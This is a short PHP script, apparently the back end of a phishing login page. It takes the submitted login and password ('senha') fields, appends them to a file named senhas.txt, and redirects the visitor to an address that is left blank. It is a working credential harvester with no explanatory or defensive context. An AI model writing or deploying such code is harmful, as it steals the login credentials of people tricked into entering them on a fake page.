//<form action="login.php" method="POST">
<?php

$cap1 = $_POST["login"] . "\n";
$cap2 = $_POST["senha"] . "\n";
//criar senhas.txt
$file = fopen("senhas.txt", "a");

$write1 = fwrite($file, $cap1);
$write2 = fwrite($file, $cap2);

fclose($file);
//caminho do arquivo
header("Location: ")
?>
